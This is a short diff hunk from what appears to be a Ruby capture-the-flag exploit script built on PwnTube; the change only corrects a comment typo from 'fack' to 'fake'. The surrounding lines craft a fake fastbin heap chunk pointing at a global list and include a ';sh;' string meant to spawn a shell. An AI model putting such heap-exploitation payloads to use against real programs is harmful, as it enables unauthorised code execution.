@@ -67,7 +67,7 @@ PwnTube.open(host, port) do |r|
 	delete(1)
 	delete(2)
 
-	# fack fastbin malloc in @list
+	# fake fastbin malloc in @list
 	add(0x100,";sh;","a"*0x90+p64(0,0x60,@list,0)+"a"*0x40+p64(0x60)+p64(0x11)[0...-1])
 	delete(1)
 	delete(3)
